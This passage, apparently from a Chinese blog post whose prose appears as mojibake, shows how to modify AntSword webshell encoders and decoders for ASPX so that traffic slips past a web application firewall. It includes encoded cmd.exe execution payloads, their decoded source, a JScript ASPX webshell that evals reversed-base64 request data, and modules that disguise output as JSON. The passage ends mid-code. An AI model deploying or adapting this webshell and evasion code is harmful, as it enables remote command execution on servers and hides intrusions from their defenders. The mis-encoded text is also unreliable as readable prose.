src="/images/antsword-bypasswaf/image-20240407160823986.png" alt="image-20240407160823986"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Write(%2208a827%22%2B%223d2565%22)%3Bfunction%20asenc(opcode)%7Bvar%20bytesToEncode%20%3D%20System.Text.Encoding.UTF8.GetBytes(opcode)%3Breturn%20System.Convert.ToBase64String(bytesToEncode)%3B%0A%7D%3Bvar%20err%3AException%3Btry%7Beval(%22var%20opcode%3D&#x27;&#x27;%3B%22%20%2B%20System.Text.Encoding.GetEncoding(%22UTF-8%22).GetString(System.Convert.FromBase64String(%22dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsidTRlODQ2MjJjOTFjNWQiXS5zdWJzdHIoMikpKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiaDkzZWQyMDA4NTlkYTIiXS5zdWJzdHIoMikpKTtpZihSZXF1ZXN0Lkl0ZW1bImc4ZTkxYzJkZjIwYjM0Il0uc3Vic3RyKDIpKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiZzhlOTFjMmRmMjBiMzQiXS5zdWJzdHIoMikpKTt2YXIgZW52YXJyID0gZW52c3RyLnNwbGl0KCJ8fHxhc2xpbmV8fHwiKTt2YXIgaTtmb3IgKHZhciBpIGluIGVudmFycikge3ZhciBzcyA9IGVudmFycltpXS5zcGxpdCgifHx8YXNrZXl8fHwiKTtpZiAoc3MubGVuZ3RoICE9IDIpIHtjb250aW51ZTt9Yy5FbnZpcm9ubWVudFZhcmlhYmxlcy5BZGQoc3NbMF0sc3NbMV0pO319ZS5TdGFydCgpO291dD1lLlN0YW5kYXJkT3V0cHV0O0VJPWUuU3RhbmRhcmRFcnJvcjtlLkNsb3NlKCk7b3Bjb2RlICs9b3V0LlJlYWRUb0VuZCgpICsgRUkuUmVhZFRvRW5kKCk7%22))%20%2B%20%22%3BResponse.Write(asenc(opcode))%3B%22%2C%22unsafe%22)%3B%7Dcatch(err)%7BResponse.Write(asenc(%22ERROR%3A%2F%2F%20%22%2Berr.message))%3B%7DResponse.Write(%226d295%22%2B%22b1d88d%22)%3BResponse.End()%3B</span><br></pre></td></tr></table></figure><p>bpè¿™æ ·å‘åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=Response.Write(%2208a827%22%2B%223d2565%22)%3Bfunction%20asenc(opcode)%7Bvar%20bytesToEncode%20%3D%20System.Text.Encoding.UTF8.GetBytes(opcode)%3Breturn%20System.Convert.ToBase64String(bytesToEncode)%3B%0A%7D%3Bvar%20err%3AException%3Btry%7Beval(%22var%20opcode%3D&#x27;&#x27;%3B%22%20%2B%20System.Text.Encoding.GetEncoding(%22UTF-8%22).GetString(System.Convert.FromBase64String(%22dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsidTRlODQ2MjJjOTFjNWQiXS5zdWJzdHIoMikpKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiaDkzZWQyMDA4NTlkYTIiXS5zdWJzdHIoMikpKTtpZihSZXF1ZXN0Lkl0ZW1bImc4ZTkxYzJkZjIwYjM0Il0uc3Vic3RyKDIpKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiZzhlOTFjMmRmMjBiMzQiXS5zdWJzdHIoMikpKTt2YXIgZW52YXJyID0gZW52c3RyLnNwbGl0KCJ8fHxhc2xpbmV8fHwiKTt2YXIgaTtmb3IgKHZhciBpIGluIGVudmFycikge3ZhciBzcyA9IGVudmFycltpXS5zcGxpdCgifHx8YXNrZXl8fHwiKTtpZiAoc3MubGVuZ3RoICE9IDIpIHtjb250aW51ZTt9Yy5FbnZpcm9ubWVudFZhcmlhYmxlcy5BZGQoc3NbMF0sc3NbMV0pO319ZS5TdGFydCgpO291dD1lLlN0YW5kYXJkT3V0cHV0O0VJPWUuU3RhbmRhcmRFcnJvcjtlLkNsb3NlKCk7b3Bjb2RlICs9b3V0LlJlYWRUb0VuZCgpICsgRUkuUmVhZFRvRW5kKCk7%22))%20%2B%20%22%3BResponse.Write(asenc(opcode))%3B%22%2C%22unsafe%22)%3B%7Dcatch(err)%7BResponse.Write(asenc(%22ERROR%3A%2F%2F%20%22%2Berr.message))%3B%7DResponse.Write(%226d295%22%2B%22b1d88d%22)%3BResponse.End()%3B&amp;g8e91c2df20b34=dU&amp;h93ed200859da2=k3Y2QgL2QgIkM6L2FzcC9hc3B4IiZkaXImZWNobyAzNjA4YjkmY2QmZWNobyAwODkzYjQxZWUwOQ%3D%3D&amp;u4e84622c91c5d=hOY21k</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°System.Convert.FromBase64Stringçš„å€¼æ˜¯ç»è¿‡base64çš„ï¼Œè§£ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(&quot;UTF-8&quot;).GetString(System.Convert.FromBase64String(Request.Item[&quot;u4e84622c91c5d&quot;].substr(2))));var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments=&quot;/c &quot;+System.Text.Encoding.GetEncoding(&quot;UTF-8&quot;).GetString(System.Convert.FromBase64String(Request.Item[&quot;h93ed200859da2&quot;].substr(2)));if(Request.Item[&quot;g8e91c2df20b34&quot;].substr(2)) &#123;var envstr = System.Text.Encoding.GetEncoding(&quot;UTF-8&quot;).GetString(System.Convert.FromBase64String(Request.Item[&quot;g8e91c2df20b34&quot;].substr(2)));var envarr = envstr.split(&quot;|||asline|||&quot;);var i;for (var i in envarr) &#123;var ss = envarr[i].split(&quot;|||askey|||&quot;);if (ss.length != 2) &#123;continue;&#125;c.EnvironmentVariables.Add(ss[0],ss[1]);&#125;&#125;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œï¼Œéƒ½æ˜¯ä¸€äº›Request.Itemï¼Œ<br><img src="/images/antsword-bypasswaf/image-20240407161139261.png" alt="image-20240407161139261"></p><p>å°†h93ed200859da2çš„å€¼è¿›è¡Œå»2åœ¨base64ï¼Œå°±æ˜¯æ‰§è¡Œäº†diräº†ã€‚<br>ç„¶åå°†h93ed200859da2çš„å€¼èµ‹å€¼ç»™äº†outï¼Œ</p><p>ç„¶åç”¨Response.Writeè¾“å‡ºã€‚<br>è¿™é‡Œå®ƒç›´æ¥è¾“å‡ºäº†ç»“æœï¼Œé‚£ä¹ˆè‚¯å®šç¼–ç ä¸åˆ°base64äº†<br>æˆ‘ä»¬è¦å°†æ¯ä¸€ä¸ªåŠŸèƒ½ç‚¹è¿›è¡Œå°†ç»“æœçš„å€¼èµ‹å€¼ç»™ä¸Šé¢æˆ‘ä»¬å®šä¹‰çš„å˜é‡ï¼Œ<br>å…ˆæ”¹å‘½ä»¤æ‰§è¡Œçš„ï¼Œå’Œinfoçš„ï¼ˆæµ‹è¯•è¿æ¥çš„ï¼‰<br>å‘½ä»¤æ‰§è¡Œåœ¨command.jsè‡ªå·±ä¸­</p><p><img src="/images/antsword-bypasswaf/image-20240407161535913.png" alt="image-20240407161535913"></p><p>æ”¹æˆ<code>opcode +=out.ReadToEnd() + EI.ReadToEnd();</code></p><p><img src="/images/antsword-bypasswaf/image-20240407161715977.png" alt="image-20240407161715977"></p><p>é‚£ä¹ˆæ­¤æ—¶å†æ¬¡è¿›è¡Œdirçš„æ—¶å€™å°±ä¼šæœ‰asencå‡½æ•°ï¼Œasencå‡½æ•°å°†qrcodebase64ç¼–ç ï¼Œç„¶åretureå°±å¯ä»¥äº†<br>æˆ‘ä»¬çš„è§£ç å™¨ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * aspx::base64è§£ç å™¨</span><br><span class="line"> * Create at: 2024/04/07 09:56:32</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  /**</span><br><span class="line">   * @returns &#123;string&#125; asenc å°†è¿”å›æ•°æ®base64ç¼–ç </span><br><span class="line">   * è‡ªå®šä¹‰è¾“å‡ºå‡½æ•°åç§°å¿…é¡»ä¸º asenc</span><br><span class="line">   * è¯¥å‡½æ•°ä½¿ç”¨çš„è¯­æ³•éœ€è¦å’Œshellä¿æŒä¸€è‡´</span><br><span class="line">   */</span><br><span class="line">  asoutput: () =&gt; &#123;</span><br><span class="line">    return `function asenc(opcode)&#123;</span><br><span class="line">    var bytesToEncode = System.Text.Encoding.UTF8.GetBytes(opcode);</span><br><span class="line">    return System.Convert.ToBase64String(bytesToEncode);</span><br><span class="line">&#125;</span><br><span class="line">    `.replace(/\n\s+/g, &#x27;&#x27;);</span><br><span class="line">  &#125;,</span><br><span class="line">  /**</span><br><span class="line">   * è§£ç  Buffer</span><br><span class="line">   * @param &#123;string&#125; data è¦è¢«è§£ç çš„ Buffer</span><br><span class="line">   * @returns &#123;string&#125; è§£ç åçš„ Buffer</span><br><span class="line">   */</span><br><span class="line">  decode_buff: (data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">    return Buffer.from(data.toString(), &#x27;base64&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè¯•ä¸€ä¸‹ï¼Œæ”¹å®Œæºç è¦é‡å¯èšå‰‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=Response.Write(&quot;a3&quot;+&quot;7b3&quot;);function asenc(opcode)&#123;var bytesToEncode = System.Text.Encoding.UTF8.GetBytes(opcode);return System.Convert.ToBase64String(bytesToEncode);</span><br><span class="line">&#125;;var err:Exception;try&#123;eval(&quot;var opcode=&#x27;&#x27;;&quot; + System.Text.Encoding.GetEncoding(&quot;UTF-8&quot;).GetString(System.Convert.FromBase64String(&quot;dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsidTRlODQ2MjJjOTFjNWQiXS5zdWJzdHIoMikpKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiaDkzZWQyMDA4NTlkYTIiXS5zdWJzdHIoMikpKTtpZihSZXF1ZXN0Lkl0ZW1bImc4ZTkxYzJkZjIwYjM0Il0uc3Vic3RyKDIpKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiZzhlOTFjMmRmMjBiMzQiXS5zdWJzdHIoMikpKTt2YXIgZW52YXJyID0gZW52c3RyLnNwbGl0KCJ8fHxhc2xpbmV8fHwiKTt2YXIgaTtmb3IgKHZhciBpIGluIGVudmFycikge3ZhciBzcyA9IGVudmFycltpXS5zcGxpdCgifHx8YXNrZXl8fHwiKTtpZiAoc3MubGVuZ3RoICE9IDIpIHtjb250aW51ZTt9Yy5FbnZpcm9ubWVudFZhcmlhYmxlcy5BZGQoc3NbMF0sc3NbMV0pO319ZS5TdGFydCgpO291dD1lLlN0YW5kYXJkT3V0cHV0O0VJPWUuU3RhbmRhcmRFcnJvcjtlLkNsb3NlKCk7b3Bjb2RlICs9b3V0LlJlYWRUb0VuZCgpICsgRUkuUmVhZFRvRW5kKCk7&quot;)) + &quot;;Response.Write(asenc(opcode));&quot;,&quot;unsafe&quot;);&#125;catch(err)&#123;Response.Write(asenc(&quot;ERROR:// &quot;+err.message));&#125;Response.Write(&quot;ff68c&quot;+&quot;cb5923&quot;);Response.End();&amp;g8e91c2df20b34=dx&amp;h93ed200859da2=KLY2QgL2QgIkM6XFxhc3BcXGFzcHgiJmRpciZlY2hvIDM2MDhiOSZjZCZlY2hvIDA4OTNiNDFlZTA5&amp;u4e84622c91c5d=oZY21k</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°ï¼Œå°†æˆ‘ä»¬çš„å®šä¹‰çš„å‡½æ•°æ”¾åˆ°å‚æ•°ä¸­äº†ï¼Œå’Œphpå®ç°åŸç†å·®ä¸å¤šã€‚<br><img src="/images/antsword-bypasswaf/image-20240407163002950.png" alt="image-20240407163002950"></p><p><img src="/images/antsword-bypasswaf/image-20240407163017550.png" alt="image-20240407163017550"></p><p>æ˜¾ç¤ºä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚<br><img src="/images/antsword-bypasswaf/image-20240407163102149.png" alt="image-20240407163102149"></p><p>ä½†æ˜¯æˆ‘ä»¬çš„åŒå‡»è¿›è¡Œç›®å½•æŸ¥çœ‹çš„æ—¶å€™ï¼Œæˆ–è€…çœ‹æ–‡ä»¶å†…å®¹å°±ä¸è¡Œã€‚<br>æ˜¯è¦æŠŠæ‰€æœ‰çš„åŠŸèƒ½ç‚¹ï¼Œè¦åŠ ä¸Šasencå‡½æ•°ã€‚è¿™é‡Œå°±ä¸ä¸€ä¸€æ›¿æ¢äº†ã€‚<br>ç›´æ¥ä¸‹è½½æˆ‘çš„é¡¹ç›®æˆ–è€…æ›¿æ¢aspxæ–‡ä»¶å¤¹å°±å¥½äº†ã€‚<br>æˆ–è€…è¿™ä¸ªå¤§å¸ˆå‚…çš„<a href="https://github.com/youncyb/AS_ASPX_AES_ENCODE/tree/main/aspx">https://github.com/youncyb/AS_ASPX_AES_ENCODE/tree/main/aspx</a><br>æˆ‘ä¹Ÿæ˜¯ç…§ç€å¤§å¸ˆå‚…æ”¹çš„<br>æ¥ä¸‹æ¥å°±æ˜¯ä¼ªè£…äº†æˆjsonäº†,é¡ºä¾¿åœ¨è¿›è¡Œé€†åº</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64è§£ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/04/07 09:56:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc å°†è¿”å›æ•°æ®base64ç¼–ç </span></span><br><span class="line"><span class="comment">   * è‡ªå®šä¹‰è¾“å‡ºå‡½æ•°åç§°å¿…é¡»ä¸º asenc</span></span><br><span class="line"><span class="comment">   * è¯¥å‡½æ•°ä½¿ç”¨çš„è¯­æ³•éœ€è¦å’Œshellä¿æŒä¸€è‡´</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc(opcode)&#123;</span></span><br><span class="line"><span class="string">    var bytesToEncode = System.Text.Encoding.UTF8.GetBytes(opcode);</span></span><br><span class="line"><span class="string">var data = System.Convert.ToBase64String(bytesToEncode).split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);</span></span><br><span class="line"><span class="string">var data1 = &#x27;&#123;&quot;message&quot;:&quot;&#x27;;</span></span><br><span class="line"><span class="string">var data2 = &#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="string">var z = data1+data+data2;</span></span><br><span class="line"><span class="string">return z;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * è§£ç  Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data è¦è¢«è§£ç çš„ Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>è§£ç åçš„ Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> res = Buffer.from(data.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯æ‹¼æ¥ä¸€ä¸‹è¾“å‡ºå³å¯ï¼Œä¸‹é¢ç»™dataæ›¿æ¢å›æ¥ã€‚</p><p><img src="/images/antsword-bypasswaf/image-20240408091907690.png" alt="image-20240408091907690"></p><p>ç„¶åå†å°†è¿™é‡Œçš„åˆ†éš”ç¬¦ç›´æ¥æ³¨é‡Šæ‰ï¼Œæ›¿æ¢ä¸ºç©ºã€‚<br>é‡å¯ä¸€ä¸‹ï¼Œçœ‹ä¸‹æ•ˆæœ</p><p><img src="/images/antsword-bypasswaf/image-20240408092047540.png" alt="image-20240408092047540"></p><p>emmmã€‚niceã€‚</p><p>è®°ä¸€ä¸‹ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">var</span> a=<span class="string">&#x27;efasnu&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> c=a(<span class="number">5</span>)+a(<span class="number">4</span>)+a(<span class="number">3</span>)+a(<span class="number">2</span>)+a(<span class="number">1</span>)+a(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> c = Request.Item[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> data = c.split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bytes = System.Convert.FromBase64String(data);</span><br><span class="line"><span class="keyword">var</span> decodedText = System.Text.Encoding.UTF8.GetString(bytes);</span><br><span class="line"><span class="built_in">eval</span>(decodedText,c);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ex) &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">ç¼–ç å™¨</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * aspx::base64ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/04/07 14:12:58</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="comment">// shell åœ¨æ¥æ”¶åˆ° payload åï¼Œå…ˆå¤„ç† pwd å‚æ•°ä¸‹çš„å†…å®¹ï¼Œ</span></span><br><span class="line">  <span class="comment">//data[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span></span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ é™¤ _ åŸæœ‰çš„payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è§£ç å™¨</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64è§£ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/04/07 09:56:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc å°†è¿”å›æ•°æ®base64ç¼–ç </span></span><br><span class="line"><span class="comment">   * è‡ªå®šä¹‰è¾“å‡ºå‡½æ•°åç§°å¿…é¡»ä¸º asenc</span></span><br><span class="line"><span class="comment">   * è¯¥å‡½æ•°ä½¿ç”¨çš„è¯­æ³•éœ€è¦å’Œshellä¿æŒä¸€è‡´</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc(opcode)&#123;</span></span><br><span class="line"><span class="string">    var bytesToEncode = System.Text.Encoding.UTF8.GetBytes(opcode);</span></span><br><span class="line"><span class="string">var data = System.Convert.ToBase64String(bytesToEncode).split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);</span></span><br><span class="line"><span class="string">var data1 = &#x27;&#123;&quot;message&quot;:&quot;&#x27;;</span></span><br><span class="line"><span class="string">var data2 = &#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span 